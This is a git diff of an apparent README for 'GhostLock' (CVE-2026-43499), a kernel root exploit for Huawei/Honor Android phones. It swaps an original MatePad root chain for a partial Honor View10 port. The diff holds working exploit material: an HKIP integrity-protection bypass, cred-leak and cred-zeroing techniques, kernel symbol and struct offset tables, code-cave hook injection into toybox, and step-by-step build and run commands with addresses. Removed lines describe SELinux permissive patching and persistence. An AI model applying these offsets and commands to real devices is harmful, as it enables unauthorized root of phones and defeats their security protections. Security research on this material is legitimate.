@@ -4,35 +4,25 @@ Japanese version (default): [README.md](README.jp-orig.md)
 
 Port and endgame for **CVE-2026-43499 ("GhostLock")**, verified end-to-end on a real device.
 
-Original description from 0ch4 (credits to him/her for the original implementation).
-
-> **Status: root achieved and verified / complete root achieved / native GMS running.**
-> `rsh -c id` / `su -c id` → `uid=0(root) gid=0(root) … context=u:r:shell:s0`, with a root-owned
-> `/data/local/tmp/rooted.txt` and a 4755 root-owned `/data/local/tmp/rsh`.
-> **Complete root**: the SELinux `shell` type is made permissive in memory (via a resident stamp
-> window) and **CAP_SYS_ADMIN** is injected, so a **direct `mount(2)`** creates a **non-nosuid tmpfs**
-> visible to every process, on which a **4755 root-owned shell** is installed (a uid-2000 process
-> executing it gets `euid=0`).
-> **Native GMS**: the real Google APKs (MindTheGapps, signed `CN=Android, O=Google Inc.`) are placed in
-> **`/system/priv-app` as privileged system apps** (overlayfs + a `system_server` rescan), and the
-> **real Play Store works** (apps really install; it self-updates).
-> The device is a **Huawei MRX-W09** (MatePad Pro 10.8, 2019) on **EMUI 11 / Android 10-based /
-> Linux 4.14.116 (Kirin 990, arm64, LTO/CFI, Huawei HKIP enabled)**.
+> **Status: alpha-1 working and verified / root to be achieved**
+> `toybox` is used in this specific exploit method because it has cave offsets wide enough
+> to be able to inject the hook.
+> `shellcode.bin` was rewritten to better cater the phone itself. It uses the same methods as the original
+> developer intended, but the targeting is different.
+> The device is a **Huawei BKL-L09** (Honor View10) on **EMUI 10 / Android 10-based /
+> Linux 4.14.116 (Kirin 970, arm64, non-LTO/CFI, Huawei HKIP enabled)**.
 
 This repository contains the exploit, the enabler, and the full research record (per-device facts,
 disassembly-derived struct offsets, and five static-analysis reports).
 
----
 
 ## TL;DR
 
-```text
-$ /data/local/tmp/rsh -c id
-uid=0(root) gid=0(root) groups=0(root),1004(input),… context=u:r:shell:s0
-
-$ ls -ln /data/local/tmp/
--rw-r--r-- 1 0 2000      67 rooted.txt
--rwsr-xr-x 1 0 2000 4094384 rsh
+```
+**Verified on-device (2026-09-28):**
+ $ adb shell cat /data/local/tmp/gl.slide | od -A d -t x8
+0000000        ffffff8751884bd0
+→ slide = 0xffffff8751881000   (KASLR base leaked; see §4 for the full chain)
 ```
 
 The interesting part is not the memory-corruption bug itself — public PoCs for CVE-2026-43499
@@ -49,14 +39,15 @@ already exist — but the **device-specific endgame**:
 
 | | |
 |---|---|
-| Device | Huawei **MRX-W09** (MatePad Pro 10.8", 2019) |
-| SoC | HiSilicon **Kirin 990** (arm64) |
-| Kernel | **Linux 4.14.116**, LTO/CFI, KASLR |
-| OS | **EMUI 11** (Android 10) |
+| Device | Huawei **BKL-L09** (Honor View 10) |
+| SoC | HiSilicon **Kirin 970** (arm64) |
+| Kernel | **Linux 4.14.116**, non-LTO/CFI, KASLR |
+| OS | **EMUI 10** (Android 10) |
 | SELinux | Enforcing, no `(allow shell … (capability …))` |
+| Paranoid State | 3 (Default Huawei state, production method) |
 | Extra | **HKIP** (Huawei Kernel Integrity Protection), HHEE/HISEe |
 
-The bootloader is locked and there is **no public unlock** for Kirin 990 (see §8), so a kernel
+The bootloader is locked and there is **no public unlock** for Kirin 970 (see §8), so a kernel
 exploit is the only root path on this device.
 
 ---
@@ -86,339 +77,237 @@ The leaf-store location was **proven by disassembling `rb_erase_cached.cfi`** in
 
 ---
 
-## 3. The endgame chain
+# 3. The BKL Port: What Differs from MRX
 
-```
-        ┌── (host) inject the enabler into /system/bin/bugreportz and run it
-        │         -> perf_event_paranoid = -1
-        ▼
-  MAIN ── fork ──> CHILD
-                     │
-                     │ 1. perf-leak its OWN cred  C  and its task_struct  X
-                     │      (sample SyS_setpriority.cfi, read x25 = current->cred)
-                     │
-   MAIN ─────────────┤ 2. leaf-zero  X + 0x820        <- HKIP pid-0 SHIELD
-                     │ 3. leaf-zero  C + 0x04        <- uid+gid = 0
-                     │
-                     │ 4. setresuid(0,0,0) -> the non-capability fallback passes
-                     │      -> commit_creds() -> uid 0, fsuid 0
-                     │
-                     │ 5. uid 0 + shell domain: writes the proof and serves root commands
-                     ▼
-             /data/local/tmp/rooted.txt   (written BY uid 0)
-             /data/local/tmp/rsh          (4755, owned by root)
-             rsh -c id                    -> uid=0(root)
-```
-
-### 3.1 The cred leak — `x25` inside `SyS_setpriority.cfi`
-
-`SyS_setpriority` materialises `current->cred` once and keeps it in a callee-saved register:
-
-```asm
-ffffff800818e354 <SyS_setpriority.cfi>:
-+0x34  mrs  x19, sp_el0            ; x19 = current
-+0x38  ldr  w8,  [x19,#1728]
-+0x3c  ldr  x25, [x19,#2536]       ; x25 = current->cred   (2536 = 0x9E8)
-+0x1f8  adrp x25, …                ; x25 reused here
-```
-
-So any sample with `ip ∈ [SyS_setpriority.cfi+0x3c, +0x1f8)` (0x1BC bytes) has
-`regs[25] == current->cred`. The exploit runs a 300 000-iteration `setpriority(0,0,-20)` storm and
-returns the last `x25` inside that window. (`perf_regs` ordering verified in the kernel tree:
-index 25 = `PERF_REG_ARM64_X25`.)
-
-Earlier attempts failed because `security_capable.cfi`'s `x0` is only the cred *at the entry
-instruction*, `cap_capable` holds it in `x20`, and an all-register vote is dominated by `current`.
-
-### 3.2 The HKIP bypass (the decisive finding)
-
-Huawei HKIP maintains a per-pid bitmap of "is allowed to be root" bits and kills tasks that look
-root-ish without their bit set. From the device kernel source
-(`drivers/hisi/hhee/hkip/critdata.c`, `include/linux/hisi/hisi_hkip.h`):
-
-```c
-static bool hkip_compute_uid_root(const struct cred *c)
-{
-    return uid_eq(c->uid,0) || uid_eq(c->euid,0) || uid_eq(c->suid,0) ||
-           !cap_isclear(c->cap_inheritable) || !cap_isclear(c->cap_permitted);
-}
-int hkip_check_uid_root(void)
-{
-    if (hkip_get_current_bit(hkip_uid_root_bits, /* def_value = */ true))
-        return 0;                       /* <-- exempt */
-    if (unlikely(hkip_compute_uid_root(creds) || uid_eq(creds->fsuid, 0))) {
-        pr_alert("UID root escalation!\n");
-        force_sig(SIGKILL, current);    /* <-- the killer */
-        return -EPERM;
-    }
-    return 0;
-}
-static inline bool hkip_get_task_bit(const u8 *bits, struct task_struct *t, bool def_value)
-{
-    pid_t pid = task_pid_nr(t);
-    if (pid != 0) return hkip_get_bit(bits, pid, PID_MAX_DEFAULT);
-    return def_value;                   /* <-- pid 0 => exempt */
-}
-```
-
-* The check runs from `__cap_capable`, `prepare_creds`, `copy_process` and `acl_permission_check`.
-* The bits can only be set by `commit_creds` (`hkip_update_xid_root`) and `fork`
-  (`hkip_init_task`) — the bitmaps live in HVC-protected memory.
-* **`task_pid_nr(task) == 0` ⇒ `def_value == true` ⇒ every HKIP check returns 0 for that task.**
-
-⇒ Zero `task_struct.pid` (offset `0x820`) **before** making the task root-ish and a single task
-becomes a complete, stable HKIP exemption. This is the "pid-0 shield". A pid-0 task must
-**never exit** (`kernel/exit.c:786` panics: *"Attempted to kill the idle task!"*), so it parks
-forever; `fork()` from it is fine and the child gets a real pid plus its HKIP bit from its now-root
-credentials.
-
-### 3.3 Root by the non-capability fallback
-
-SELinux on this policy grants `shell` **no capabilities** (`(allow adbd self (capability (setuid)))`
-exists, `shell` is absent), so every `ns_capable(CAP_SETUID)` route is dead. The only path through
-`setresuid(0,0,0)` is its **non-capability fallback**:
-
-```c
-if (!ns_capable(old->user_ns, CAP_SETUID)) {
-    if (ruid != -1 && !uid_eq(kruid, old->uid) && !uid_eq(kruid, old->euid) &&
-                      !uid_eq(kruid, old->suid)) goto error;
-    …
-}
-```
-
-so making `old->uid == 0` (the leaf store at `cred+0x04`) is sufficient. `commit_creds()` then gives
-`uid 0` and `fsuid = euid = 0` (hence root-owned files), and HKIP's check passes because of the
-shield.
-
-### 3.4 Root shell on a `nosuid` `/data`
-
-`/data` is mounted `nosuid`, so a 4755 binary there cannot gain root. Instead the shielded uid-0 task
-**serves root commands on an abstract unix socket (`\0gl_su`)**; `rsh` is the same binary in client
-mode and forwards `-c CMD`. Each request forks a grandchild, whose `copy_process → hkip_init_task()`
-writes its HKIP bit from the root creds (real pid) — a legal root task.
+*(the core section — the material below is written from the verified session record, every claim traceable to a measurement)*
 
 ---
 
-## 4. Layout
+## 3.1 Architecture: Why Toybox
+
+The reference chain (MRX-W09, Kirin 990, EMUI 11) hooks `/system/bin/bugreportz` — on that build, a single unified binary that runs both as the uid-2000 shell client and as the uid-0 dumpstate service. The hook lands in a normal function prologue, in a fully-initialized process, and the payload's two-guard design dispatches on the uid it finds itself running under.
+
+**BKL (EMUI 10) breaks both halves of that design.**
+
+First, the binary is split: `/system/bin/bugreportz` is an 11 KB socket client (Android 29, connects to the `dumpstatez` service, execs nothing), and `/system/bin/dumpstate` (355 KB, BuildID `752695f3…`) is the uid-0 service side. Second — and decisively — EMUI 10's SELinux policy denies the shell domain even `read` on dumpstate:
 
 ```
-exploit/ghostlock_mrx_e.c   the exploit (single file, many diagnostic modes; the endgame is --simple)
-exploit/offset_mrx.h        struct offsets / symbol offsets for this build
-enabler/inject_hook.c       host-side enabler injected into /system/bin/bugreportz
-docs/FACTS.md               the per-device research log (facts 9an(1)…(133))
-docs/HKIP_DECODED_20260922.md
-docs/SYMBOLS_20260926.md    ground-truth symbols from the device's own vmlinux.elf
-docs/static-analysis/       five disassembly/policy reports (write shape, cred offsets,
-                            pid-0 risk, shell capability, file_operations)
+$ adb shell ls -la /system/bin/dumpstate
+ls: /system/bin/dumpstate: Permission denied
+```
+
+The Mali primitive's staging step needs `open(target, O_RDONLY)` — a file the shell domain cannot read cannot be the patch target. The obvious port was dead before it started.
+
+Three host candidates were evaluated before landing on the final one:
+
+| Candidate | Result |
+|---|---|
+| APEX libc (`__libc_init`) | **Worked mechanically — crashed its hosts.** The payload runs mid-`__libc_init`, before TLS init and pthread state exist; every payload generation that touched process state in that window produced SIGSEGVs in the host process (fault addrs 0x10–0x1b4). Four failure theories (fork, callee-saved clobber, timing, worker side-effects) were eliminated by measurement before the *context itself* was identified as the variable — the reference design never had this problem because its hook target gives the payload a sane execution environment. |
+| `/system/bin/dumpstate` | SELinux read-denied for the shell domain. Dead on arrival. |
+| **`/system/bin/toybox`** | **The answer.** |
+
+Toybox wins on four properties, each verified on-device:
+
+1. **Both worlds exec it.** Every `adb shell` command runs a toybox applet as uid 2000 — and dumpstate's bugreport sweep execs toybox applets (`df`, `uptime`, …) **as uid 0 in the dumpstate domain**. One file, two personalities: the reference design's property, reconstructed.
+2. **The shell domain can read it** (`dd if=/system/bin/toybox` succeeds — the generic `system_file`-class label, unlike dumpstate's protected one).
+3. **Cave space.** The executable segment's tail (`0x6b974`–`0x6c000`, past the last live PLT entry) is ~1.6 KB of mapped, unreferenced, executable padding — four times the APEX libc cave, enough for the reference payload whole.
+4. **A replicable prologue.** `main` at `0x29050` opens with `sub sp, sp, #0x80` (`0xd10203ff`) — a pure stack adjustment with no register side-effects, the ideal instruction for the save/replicate/branch-back wrapper pattern.
+
+The resulting arm parameters:
+
+```
+hook site:   0x29050   (main prologue; restore word 0xd10203ff)
+branch-back: 0x29054
+cave:        0x6b974   (payload lands at page+0x974)
+payload:     rev 7b-fixed, 348 B, ph = size−4 = 0x158 (tool-enforced)
+```
+
+One incidental proof recording: for a week before the pivot, every `adb shell` command on the development device ran through a hooked toybox fast path — dozens of processes per session, zero fast-path failures. The host was soak-tested by accident before it was ever chosen deliberately.
+
+## 3.2 The Policy Wall and the Perf-Broker Worker
+
+The reference chain's enabler writes `perf_event_paranoid = -1` from the uid-0 process, then runs the whole leak suite from shell. **On EMUI 10 that sysctl write is policy-denied** — measured, with the rule named:
+
+```
+avc: denied { write } scontext=u:r:dumpstate:s0
+      tcontext=u:object_r:proc_perf:s0 tclass=file permissive=0
+```
+
+(EMUI 11's dumpstate may write `proc_perf`; EMUI 10's may not — the two builds diverge exactly here.) The complete channel map, measured on-device across one trigger cycle:
+
+| Channel | dumpstate domain | Notes |
+|---|---|---|
+| `perf_event_open` (CAP_SYS_ADMIN) | ✅ granted | **the one open door** |
+| `proc_perf` sysctl write | ❌ denied | rule quoted above |
+| `/dev/kmsg` write | ❌ denied | `kmsg_device` chr_file |
+| abstract unix socket → shell-owned | ❌ denied | `{ connectto }` on `unix_stream_socket`, path `\0gl_leak` in the audit record |
+| file create in `/data/local/tmp` | ✅ granted | `shell_data_file` create — looser than EMUI 11, and load-bearing below |
+
+The design consequence: the sysctl route is dead, so **the leak must run inside the privileged context itself**. The payload's worker — gated to run exactly once per boot (`O_EXCL` on its output file doubles as the fast-path check) — does the entire leak synchronously in the uid-0 host process and relays the result by the one channel that works: an 8-byte raw file in `/data/local/tmp`, written `0666` via an explicit `fchmod` (the creating context's umask strips create-time mode bits — measured).
+
+The synchronous design was not the first choice — it was the survivor. A fork-based variant (`clone` from the hooked context) crashed hosts in the `__libc_init` era; a socket-relay variant died on the `connectto` denial; the synchronous worker survived five full bugreport cycles and a system shutdown with zero host failures. The bounded work (a 100-iteration syscall storm, ~1 ms) is invisible to the host.
+
+## 3.3 Constants Table (BKL, disassembly-verified)
+
+Derived from the device's own kernel image (`kernel.img` from the exact full-OTA, version-string-matched to `/proc/version`; the `.177`/`.179` EMUI incrementals share one kernel build — identical build timestamp and clang string, offsets valid across both).
+
+**Symbols:**
+
+```
+_stext                     0xffffff8008081000   (KASLR anchor)
+__schedule                 0xffffff800a2aa890
+do_futex.cfi               0xffffff800827dfbc
+rt_mutex_adjust_prio_chain 0xffffff800821c724
+SyS_setpriority.cfi        0xffffff80081a4b60
+commit_creds.cfi           0xffffff80081c2160
+SyS_setresuid.cfi          0xffffff80081a64e4
+init_cred                  0xffffff800b2c65e8
+init_task                  0xffffff800b2b5600
+empty_zero_page            0xffffff800b780000
+sysctl_perf_event_paranoid 0xffffff800b2a65b4
+hkip_uid_root_bits         0xffffff800b9de000
+hkip_gid_root_bits         0xffffff800b9df000   (BKL enforces the GID side — see 3.4)
+```
+
+**Struct offsets:**
+
+```
+task_struct:  pid 0x650   real_cred 0x810   cred 0x818   comm 0x820
+              prio 0x100  pi_lock 0x8f8  pi_waiters 0x918  pi_blocked_on 0x930
+cred:         uid 0x04  gid 0x08  euid 0x14  fsuid 0x1c
+              cap_inheritable 0x28  cap_permitted 0x30  cap_effective 0x38
+rt_mutex_waiter:  task 0x30  lock 0x38  prio 0x40  deadline 0x48  (size 0x50 — identical to MRX)
+rt_mutex:         wait_lock 0x00(0x18, DEBUG_SPINLOCK)  rb_root 0x18
+                  rb_leftmost 0x20  owner 0x28           (identical to MRX)
+```
+
+Two extraction notes for porters: `hkip_init_task` yields `task_struct->cred` and `->pid` in a single function (inlined `get_task_cred` + the pid bit-index arithmetic), and the walk's `rb_erase_cached` call site sits at `rt_mutex_adjust_prio_chain+0x20c`, with the top-waiter BUG branch at `+0x28c` and the chain-depth limit in a global at `0xffffff800b2ccff8`.
+
+**One correction inherited from this port:** BKL's kernel is **non-LTO clang CFI** — `CONFIG_LTO_NONE`, but `.cfi` symbol twins throughout. The config string alone misleads; check the symbol table.
+
+**And the leak window, ported:** `SyS_setpriority.cfi+0x3c` (`ldr x25, [x19, #cred]`) through `+0x1f8` — byte-identical window to MRX across the different cred offset. The `x25` cred-leak design transfers with one constant change (`0x9E8` → `0x818`).
+
+## 3.4 BKL-Specific Endgame Notes (from source, not yet executed)
+
+Two divergences from the reference endgame, both from the device's own GPL kernel source:
+
+1. **The GID bitmap is enforced.** `hkip_check_xid_root()` = `hkip_check_uid_root() ?: hkip_check_gid_root()`, and `hkip_compute_gid_root` covers gid/sgid/`in_egroup_p(0)`/fsgid. The reference README's shield analysis (pid-0 → `def_value=true`) applies to both bitmaps — but a port that zeroes gid *without* the shield (e.g. the leaf-store at `cred+0x04` clearing uid+gid together, unshielded) walks into `hkip_check_gid_root`'s SIGKILL on the next permission check. The reference's `--simple` route is safe only *because* the pid-0 shield neutralizes both bitmaps.
+2. **`cap_effective` remains unexamined by HKIP.** `hkip_compute_uid_root` checks `cap_inheritable` and `cap_permitted` but not `cap_effective` — the shield-free route (inject `CAP_SETUID` at `cred+0x38`, `setresuid(0,0,1)`, `commit_creds` sets the bit legitimately via `hkip_update_xid_root`, real pid, no shield, no idle-task landmine) transfers to BKL as-is. `commit_creds → hkip_update_xid_root` verified present at `cred.c:489`.
+
+Both routes are source-verified but **not yet executed on this device** — the write primitive has not yet been fired. See §4.
+
+---
+
+# 4. Verified State — "Alpha-1"
+
+*(every output below is real, from the session of 2026-09-28)*
+
+The complete enabler chain — Mali page-cache write, toybox hook, payload worker — is verified end-to-end. The leak it produces:
+
+```
+$ adb shell ls -la /data/local/tmp/gl.slide
+-rw-rw-rw- 1 root root 8 /data/local/tmp/gl.slide
+
+$ adb shell cat /data/local/tmp/gl.slide | od -A d -t x8
+0000000        ffffff8751884bd0
+0000008
+```
+
+Decode:
+
+```
+v     = 0xffffff8751884bd0              (sample[0].IP — a kernel-text address)
+slide = (v & ~0x1FFFFF) + 0x81000
+      = 0xffffff8751800000 + 0x81000
+      = 0xffffff8751881000
+```
+
+Consistency check against the banked symbol table: the slide's low 21 bits (`0x81000`) match `_stext`'s (`0xffffff8008081000 & 0x1FFFFF = 0x81000`) — the mask math and the sampled address agree, and the ~29 GB KASLR displacement is in the expected range for this kernel. **The first kernel address of the chain, read off the device, consistent with the ground-truth vmlinux the constants table was derived from.**
+
+What is verified, itemized:
+
+| Component | Evidence |
+|---|---|
+| Mali page-cache primitive (G72) | four-way verification every arm: same-fd read-back + exec-view probe, both pages, every cycle |
+| Toybox hook + wrapper | both pages PATCHED; dozens of processes through the fast path; worker completed and returned cleanly (host process survived) |
+| Payload worker end-to-end | perf event opened with CAP_SYS_ADMIN past paranoid=3; ring mmapped; storm; sample read; 8-byte relay file written |
+| File relay + readability | `0666` via fchmod; shell reads the result directly |
+| KASLR slide | the od line above, decoded and cross-checked |
+
+What is **not** yet done: the task/cred leaks (same relay pattern, storm bound liftable now that the context is sane), the futex race/stamp/write primitive (all constants verified, calibration pending), and both endgame routes (source-verified, unfired). The chain's status, one line: **enabler complete, first leak banked, zero known defects in the delivered components, everything downstream specified and constant-ready.**
+
+---
+
+## 5. Layout
+
+```
+exploit/bkl_slide_toybox.s   the slide-leaker payload (rev 7b-fixed, 348 B)
+enabler/inject_hook.c        the gated page-cache patcher (five-gate final form)
+exploit/toybox_pristine      pristine reference for deterministic page construction
+docs/constants.md            the BKL constants table (§3.3)
+docs/facts/                  the per-session measurement log
 ```
 
 ---
 
-## 5. Build
+## 6. Build
 
 ```sh
-aarch64-linux-android24-clang -O2 -static -pthread -o ghostlock_e ghostlock_mrx_e.c
+# Build (payload):
+ $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/clang --target=aarch64-linux-android29 \
+    -c bkl_slide_toybox.s -o bkl_slide_toybox.o
+ $NDK/.../llvm-objcopy -O binary --only-section=.text bkl_slide_toybox.o shellcode.bin
+# Build (tool):
+ $NDK/.../clang --target=aarch64-linux-android29 -O2 -static -o inject_hook inject_hook.c
 ```
 
-(NDK r20b used here.)
+(NDK r27c used here.)
 
-## 6. Run
+## 7. Run
 
 ```sh
-adb push ghostlock_e /data/local/tmp/
-adb shell chmod 755 /data/local/tmp/ghostlock_e
+# 1) stage (content gates first):
+adb shell md5sum /data/local/tmp/shellcode.bin     # must match the banked rev-7b-fixed hash
+adb shell rm -f /data/local/tmp/gl.slide
 
-# 1) arm and inject the enabler, then trigger it
-adb shell /data/local/tmp/inject_hook place 0x84000 0x244 0x7a3d8
-adb shell /data/local/tmp/inject_hook hook  0x7a3d4 0x84000
-adb shell nohup /system/bin/bugreportz >/dev/null 2>&1 &
-adb shell /data/local/tmp/inject_hook restore 0x7a3d4 0xd10403ff
-adb shell cat /proc/sys/kernel/perf_event_paranoid      # expect -1
+# 2) arm (ph is tool-enforced; all verify lines must read PATCHED):
+adb shell /data/local/tmp/inject_hook place 0x6b974 0x158 0x29054
+adb shell /data/local/tmp/inject_hook hook 0x29050 0x6b974
 
-# 2) run the endgame
-adb shell nohup /data/local/tmp/ghostlock_e --simple >/dev/null 2>&1 &
+# 3) trigger (root toybox exec in dumpstate's sweep):
+adb shell "setsid /system/bin/bugreportz < /dev/null > /data/local/tmp/brz.log 2>&1 &"
 
-# 3) verify
-adb shell ls -ln /data/local/tmp/rooted.txt /data/local/tmp/rsh
-adb shell /data/local/tmp/rsh -c id
+# 4) read the leak:
+adb shell ls -la /data/local/tmp/gl.slide
+adb shell cat /data/local/tmp/gl.slide | od -A d -t x8
+#    decode: slide = (v & ~0x1FFFFF) + 0x81000
+
+# 5) restore BEFORE any reboot:
+adb shell /data/local/tmp/inject_hook restore 0x29050 0xd10203ff
 ```
 
 ---
 
-## 7. Verified result
+## 8. Credits
 
-```
-=== /data/local/tmp/rooted.txt ===
-=== GHOSTLOCK MRX-W09 rooted ===
-uid=0 euid=0 context=u:r:shell:s0
-
-$ /data/local/tmp/rsh -c id
-uid=0(root) gid=0(root) groups=0(root),1004(input),… context=u:r:shell:s0
-
-$ ps -A -o PID,UID,NAME | grep ghostlock
- 4441     0 ghostlock_e        # the shielded uid-0 task
- 4212  2000 ghostlock_e        # the launcher
-```
-
-## 8. What this root is **not**
-
-* The bounding set is `0xc0` and the post-`setresuid` cred has **no capabilities**, and the domain
-  stays `u:r:shell:s0`. It is **"uid 0 by DAC inside the shell domain"** — not `mount`, not
-  `insmod`, not `/dev/block`, not `/system` writes.
-* It is **per boot** (the exploit re-runs at every boot). The bootloader is **locked** and there is
-  no public Kirin 990 unlock (PotatoNV stops at Kirin 960; the BootROM CVEs were mitigated by an
-  eFuse that kills USB Download Mode; the testpoint/board-software method is Kirin 990 **5G**-only
-  and the MatePad Pro 2019 board software is not public). A kernel exploit cannot reach the
-  bootloader — verified-boot keys and the unlock state live in ROM/eFuse/TEE.
-* Raising the privilege further (full capabilities + `mount`) is in progress: the `--cede` path
-  (`task->cred = &init_cred` under the pid-0 shield) yields `CAP_FULL_SET` and the kernel SELinux
-  domain; the open problem is that the kernel domain denies user file I/O, so the plan is a patched
-  policy loaded from the cede'd task (see `docs/FACTS.md` 9an(133)+).
-
-## 9. Credits
+> For complete transparency, the author of the repository would like to indicate
+> that since this project is a current work-in-progress and based on the findings of
+> another developer, cited below, the README draws on a mix of findings indicated by both
+> the author's device (Berkeley BKL-L09 eg. Honor View 10) and the creator's own device
+> (Huawei MatePad). Everything on this README was inspired by the author's (Kirin 990 / EMUI 11) device
+> and is included as prior art for the BKL road map. None of the previous implementations have been attempted
+> or verified on BKL-L09. Original: https://github.com/0ch4/ghostlock-mrx-w09.
+> Kept for reference only.
 
 * The GhostLock vulnerability and the original PoC family: the upstream authors named in
   `ghostlock_pocs/`.
 * The "sample a register that materialises the cred" idea: the **aquos-r6** PoC family.
 * Everything under `docs/` was derived from this device's own `vmlinux.elf` and kernel tree.
+* 0ch4 for his/her findings for the MatePad, that permitted me to find out specific triggers that also worked on my device.
 
-## 10. Disclaimer
+
+## 9. Disclaimer
 
 Security research on a device owned by the author, for interoperability and repair purposes.
 CVE-2026-43499 is public and many PoCs already exist. Do not use this against devices you do not
 own. Provided as-is, no warranty. See [docs/PUBLICATION_REVIEW_ja.md](docs/PUBLICATION_REVIEW_ja.md) for the formal legal notice and disclaimer.
-
-## 11. Persistence
-
-There is **no fully-autonomous re-root** on this device (static survey: no boot-time actor execs from
-a writable path; only the `shell` domain may exec `shell_data_file`; setuid is dead because `/data`
-is `nosuid`).  `/data` persists, so re-rooting after a reboot is one command:
-
-```sh
-adb shell /data/local/tmp/reroot.sh
-```
-
-See [docs/static-analysis/TASK_PERSISTENCE_20260926.md](docs/static-analysis/TASK_PERSISTENCE_20260926.md)
-and [tools/reroot.sh](tools/reroot.sh).
-## 12. Progress toward complete root (2026-09-26)
-
-The verified root is **uid 0 with no capabilities in `u:r:shell:s0`**. Work continues toward
-**complete root** (arbitrary capabilities, `mount`, `/dev/block`, ...); every major ingredient is
-individually verified on-device:
-
-| ingredient | status |
-|---|---|
-| uid 0 + shell domain + root server (`rsh`/`su`) | verified |
-| **CAP_SYS_ADMIN injection** (address-selection; proven by read-back) | verified |
-| **making the SELinux `shell` type permissive** (via a resident stamp window, `--freeze`) | verified (the `mount` errno changed EACCES -> EPERM, i.e. SELinux no longer denies) |
-| integration (`mount(2)` -> non-nosuid -> a 4755 root shell) | **ACHIEVED + GLOBAL** (`--root`: measured mount rc=0, a 4755 root-owned shell, and a uid-2000 exec of it yields euid=0). The mount is **visible to every process**: the shell/exploit already share init's mount namespace (`self == /proc/1/ns/mnt == mnt:[4026533392]`, identical mount ids), so a separate `adb shell` and `system_server` (a slave clone) both see it - see `docs/FACTS.md` (152). `setns("/proc/1/ns/mnt")` is therefore unnecessary (it returns EPERM because Huawei's `mntns_install` also requires `CAP_SYS_CHROOT`). `mount -t overlay` is also verified working with a real `/system` lowerdir |
-
-Key technical constraint: the write primitive can only store a **kernel pointer** or **literal 0** -
-it cannot store **small integers** (e.g. `ebitmap_node.startbit`).  Arbitrary bytes are therefore only
-available through a **resident stamp window** (from `copy_from_user`), which is the key to complete
-root.  See `docs/FACTS.md` (9an(1)-(150)) and `docs/static-analysis/*_20260926.md`.
-
-## 13. 2026-09-26 addendum: the PC-less restore is complete (+36 s) and the operational traps
-
-### 13.1 The measured procedure (PC-less, one trigger)
-
-With `shellcode.bin` (the payload), `glboot.sh`, `gms_setup.sh`, `ghostlock_e` and `gms_stage`
-present in `/data/local/tmp`:
-
-```sh
-# 1) arm the enabler (a Mali page-cache write; RAM only)
-inject_hook place 0x84000 <payload_size-4> 0x7a3d8     # 0x2cc for a 720 B payload
-inject_hook hook  0x7a3d4 0x84000
-
-# 2) exactly ONE trigger (= Settings > Developer options > Take bug report)
-nohup /system/bin/bugreportz &
-```
-
-**Measured from a cold boot**: at **+36 s** `perf_event_paranoid=-1`, the three overlays
-(`/system/priv-app`, `/system/etc/permissions`, `/system/etc/sysconfig`) are mounted, and
-`com.google.android.gms` / `com.google.android.gsf` / `com.android.vending` are all
-**PRIVILEGED**.
-
-One trigger starts **two** processes and the payload's two-stage guard takes both:
-
-| process | uid | domain | may write perf | may exec `shell_data_file` |
-|---|---|---|---|---|
-| `bugreportz` (started by `com.android.shell`) | 2000 | **u:r:shell:s0** | no | **yes (the only one)** |
-| `dumpstate` (started by init) | 0 | u:r:dumpstate:s0 | yes (CapEff=`0000007fffffffff`) | no |
-
-### 13.2 Traps (all measured; read before reusing the machinery)
-
-1. **A capability-less uid-0 domain consumes stage 1.** `u:r:installd:s0` cannot write perf
-   (EACCES) and has no CAP_DAC_OVERRIDE to unlink its marker either. The payload must therefore
-   **write perf first and only claim the one-shot when that write succeeded**; otherwise the
-   exploit dies with `[-] KASLR leak failed` (`ghostlock_mrx_e.c:3365`) after wasting minutes.
-2. **The su server (`\0gl_su`) cannot mount.** Its child has `CapEff=0000000000000000`,
-   `CapBnd=0x00000000000000c0`, so `mount(2)` -> EPERM and `mkdir` in `/data/local/tmp`
-   (`shell:shell 0771`) -> EACCES. Only the **exploit's own uid-0 child
-   (`ghostlock_e --root-gms`)** can mount, stage and restart the framework.
-3. **`/dev` cannot hold a marker.** It is `tmpfs 0755 root:root`: a uid-2000 process fails on
-   DAC and the dumpstate domain is refused by SELinux. Markers can only live in
-   `/data/local/tmp`.
-4. **Markers survive reboots.** If both are present at boot the payload returns on EEXIST and
-   nothing can restore (neither the app nor installd can unlink them). Releasing them on
-   success - or unlinking a stale `.glp2` from the uid-0 path - is a known open item.
-5. **Never run the exploit twice in one boot** - it resets the device (FACTS 9an(164)D).
-   `inject_hook restore` in the same boot is the same hazard (a second Mali write).
-6. **The Play self-update is what "corrupts" the device.** Signing in makes GMS/Play update
-   into `/data/app`; their system base only ever existed in the per-boot overlay, so the next
-   cold boot leaves a non-privileged `/data` copy that requests privileged components
-   (`INTERACT_ACROSS_USERS`, `MANAGE_USERS`) and crash-loops. Turn auto-update OFF, or use
-   Aurora Store.
-7. **The device may refuse to install the front-end app** (Play Protect / Huawei confirmation:
-   `INSTALL_FAILED_ABORTED: User rejected permissions`). Disable Play Protect scanning, or
-   tap the APK from `/sdcard`.
-8. **The `su` symlink can be missing (measured).** A factory reset wipes all of
-   `/data/local/tmp`. Even when `ghostlock_e --root` succeeds and the `\0gl_su` server is up,
-   if the client `/data/local/tmp/su` (a symlink to `ghostlock_e`) is absent then
-   `su -c true` fails, the restore wrongly concludes "no root server", releases the per-boot
-   lock and retries -> **multiple concurrent exploit runs** (load spike; watchdog / pid-0
-   panic risk). Two fixes: (a) probe with the **name-independent**
-   `ghostlock_e --rshcli 'id -u'` == 0 (fallback `su -c true`); (b) `provision.sh` does
-   `ln -sf ghostlock_e /data/local/tmp/su`. (Sources: `docs/session_20260926/ROOTSHELL_MEMO_20260926.md` §4, `evidence/CHANGE09_neutralize_marker.txt`.)
-9. **Keep `/data/local/tmp/gms_stage` as a plain FILE.** The dangerous old `.rc` payload
-   mounted `lowerdir=/data/local/tmp/gms_stage/{permissions,sysconfig,priv-app}:...`.
-   With `gms_stage` kept as a 0-byte regular file, `gms_stage/<x>` is **ENOTDIR** and those
-   mount lines can never succeed: reset-safe and reboot-persistent belt+braces (the current
-   marker `.rc` has no mount lines at all). (Source: `evidence/CHANGE09_neutralize_marker.txt`.)
-
-### 13.3 Related
-
-* GMS guide (separate repository): https://github.com/0ch4/ghostlock-mrx-w09-gms
-* Front-end app design (one-tap restore): `ghostlock_app/DESIGN.md` (every claim marked
-  measured / to-confirm)
-* Measurement log: `binder_uaf/session_20260922/MRX_W09_GHOSTLOCK_FACTS.md` (9an(1)..(168))
-
----
-
-## 14. Latest verified state (2026-09-26 addendum, up to the CHANGE 08 neutralization)
-
